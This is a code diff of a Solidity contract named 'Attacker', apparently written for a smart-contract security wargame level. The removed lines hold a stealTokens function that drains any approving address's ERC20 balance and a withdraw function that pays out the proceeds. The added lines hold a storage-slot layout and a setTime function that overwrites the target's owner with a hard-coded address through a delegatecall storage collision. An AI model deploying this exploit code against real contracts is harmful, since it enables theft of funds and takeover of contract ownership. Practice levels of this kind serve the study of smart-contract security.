@@ -1,21 +1,20 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma experimental ABIEncoderV2;
-pragma solidity ^0.6.5;
+pragma solidity ^0.8.0;
 import "./Contract.sol";
 
 contract Attacker {
-    ERC20 token; //0x78a705f2108B095e49161d6E42aDB7cB53E07e57
-    address owner;
-    constructor(ERC20 _token) public {
-        token = _token;
-        owner = msg.sender;
-    }
+  // public library contracts 
+  //slot 0
+  address public timeZone1Library;
+  //slot 1
+  address public timeZone2Library;
+  //slot 2
+  address public owner; 
+  //slot 3
 
-    function stealTokens(address _from) public {
-        token.transferFrom(_from, address(this), token.balanceOf(_from));
-    }
 
-    function withdraw() public {
-        token.transfer(msg.sender, token.balanceOf(address(this)));
-    }
+  function setTime(uint _time) public {
+    owner = 0x80805ae3cbE23715C1f1807A03C5fb669541C2A9; 
+  }
 }
